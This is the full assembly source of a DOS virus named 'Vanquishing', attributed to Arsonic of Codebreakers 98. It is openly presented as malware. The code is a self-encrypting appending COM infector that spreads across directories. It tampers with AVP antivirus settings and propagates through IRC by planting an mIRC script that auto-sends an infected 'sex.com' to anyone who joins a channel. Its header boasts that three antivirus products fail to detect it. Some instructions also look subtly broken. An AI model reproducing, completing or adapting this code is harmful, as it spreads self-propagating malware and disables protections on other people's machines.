;  Vanquishing by Arsonic
;  Type: Direct Action Appending COM infector
;
;  Notes: Attempts to Spread VIA Irc Clients by modifying the Script.ini
;  to send a file called SEX.COM to everyone who joins a Channel the infected
;  person is currently on.
;
;  Attempts to patch the avp antivirus.
;
;
;  Detection Stats:
;  AVP:  NOTHING
;FPROT:  NOTHING
; TBAV:  NOTHING
;
db 0e9h,0,0
VANQUISHING_START:

call DELTA
DELTA:
pop bp
sub bp,offset DELTA

lea si,[bp+ENCRYPTION_START]
mov di,si
mov cx,VANQUISHING_END - ENCRYPTION_START
call CRYPTO
jmp ENCRYPTION_START

CRYPTO:
lodsb
ror al,3
not al
xor al,byte ptr [bp+KEY]
not al
rol al,3
stosb
loop CRYPTO
ret

KEY db 0

ENCRYPTION_START:
mov di,100h
mov cx,3
cmp byte ptr [bp+BUFF_STORE],1
jne BUFF_SEC
lea si,[bp+BUFF_THREE_ONE]
jmp RESTORE_BUFFER
BUFF_SEC:
lea si,[bp+BUFF_THREE_TWO]
RESTORE_BUFFER:
rep movsb

mov ah,3ch
xor cx,cx      
lea dx,[bp+AVPSET]              
int 21h
jc FIND_FIRST

xchg bx,ax                

mov ah,40h                
lea dx,[bp+Patch_Start]         
mov cx,Patch_End - Patch_Start  
int 21h

mov ah,3eh                
int 21h

FIND_FIRST:
mov ah,4dh
lea dx,[bp+FILEMASK]
FIND_NEXT:
call INC_CALL
int 21h
jnc INFECT

mov ah,3bh
lea dx,[bp+DOTDOT]
int 21h
jnc FIND_FIRST

mov ah,3ch
lea dx,[bp+Script]
xor cx,cx
int 21h
jc CLOSE

xchg bx,ax          

mov ah,40h          
lea dx,[bp+SCRIPT_LINE_START]
mov cx,SCRIPT_LINE_END - SCRIPT_LINE_START
int 21h

mov ah,3eh         
int 21h

mov ah,3ch
lea dx,[bp+SEX]
xor cx,cx
int 21h

xchg bx,ax

mov ax,4200h
xor cx,cx
xor dx,dx
int 21h

mov ah,40h
lea dx,[bp+BYTES_START]
mov cx,BYTES_END - BYTES_START
int 21h

mov ax,4202h
xor cx,cx
xor dx,dx
int 21h

mov ah,40h
lea dx,[bp+VANQUISHING_START]
mov cx,VANQUISHING_END - VANQUISHING_START
int 21h

mov ah,3eh
int 21h

CLOSE:
mov di,100h
jmp di

INFECT:
mov ax,4301h
mov dx,9eh
xor cx,cx
int 21h

mov ax,3d02h
mov dx,9eh
int 21h

xchg bx,ax

mov ah,3fh
lea dx,[bp+TEMP_ONE]
mov cx,3
int 21h

mov ax,word ptr[80h + 1ah]      
sub ax,VANQUISHING_END - VANQUISHING_START + 3  
cmp ax,word ptr[bp+TEMP_ONE+1]    
je CLOSE_FILE         

mov ax,word ptr[80h + 1ah]      
sub ax,3                
mov word ptr[bp+TEMP_TWO+1],ax 

mov ax,4200h
xor cx,cx
xor dx,dx
int 21h

mov ah,3fh
lea dx,[bp+TEMP_TWO]
mov cx,3
call INC_CALL
int 21h

call RANDOM_LOC

mov ax,4202h
xor cx,cx
xor dx,dx
int 21h

call SNAG_KEY

mov ah,3fh
lea dx,[bp+VANQUISHING_START]
mov cx,ENCRYPTION_START - VANQUISHING_START
call INC_CALL
int 21h

lea si,[bp+ENCRYPTION_START]
lea di,[bp+VANQUISHING_END]
mov cx,VANQUISHING_END - ENCRYPTION_START
call CRYPTO

mov ah,3fh
lea dx,[bp+VANQUISHING_END]
mov cx,VANQUISHING_END - ENCRYPTION_START
call INC_CALL
int 21h

CLOSE_FILE:
mov ah,3eh
int 21h

mov ah,4eh
jmp FIND_NEXT

INC_CALL:
inc ah
ret

SNAG_KEY:
in al,40h
mov byte ptr [bp+KEY],al
ret

RANDOM_LOC:
mov ah,2ch
int 21h
cmp dh,30
ja SEC_LOC
FIR_LOC:
mov byte ptr [bp+BUFF_THREE_ONE],byte ptr [bp+TEMP_TWO]
mov byte ptr [bp+BUFF_THREE_TWO],byte ptr [bp+TEMP_ONE]
mov byte ptr [bp+TEMP_TWO],0
mov byte ptr [bp+TEMP_ONE],0
mov byte ptr [bp+BUFF_STORE],2
ret
SEC_LOC:
mov byte ptr [bp+BUFF_THREE_ONE],byte ptr [bp+TEMP_ONE]
mov byte ptr [bp+BUFF_THREE_TWO],byte ptr [bp+TEMP_TWO]
mov byte ptr [bp+TEMP_TWO],0
mov byte ptr [bp+TEMP_ONE],0
mov byte ptr [bp+BUFF_STORE],1
ret

SCRIPT_LINE_START:
db '[script]',13,10
db 'n0=on 1:JOIN:#:/dcc send $nick C:\mirc\sex.com',13,10
SCRIPT_LINE_END:

PATCH_START:
db 'KERNEL.AVC',13,10
db 'TROJAN.AVC',13,10
db 'UNPACK.AVC',13,10
db 'EXTRACT.AVC',13,10
db 'MAIL.AVC',13,10
db 'EICAR.AVC',13,10
db 'MACRO.AVC',13,10
PATCH_END:

BYTES_START:
nop
nop
nop
BYTES_END:

AVPSET DB 'c:\avp\avp.set',0
BUFF_THREE_ONE db 0e9h,0,0
BUFF_THREE_TWO db 0cdh,20h,0
FILEMASK db '*.com',0
BUFF_STORE db 2
TEMP_ONE db 0
TEMP_TWO db 0
DOTDOT db '..',0
VANQ db ' [VANQUISHING] [BY ARSONIC] [CODEBREAKERS 98] '
SEX  db 'c:\mirc\sex.com',0
SCRIPT db 'c:\mirc\script.ini',0
VANQUISHING_END:

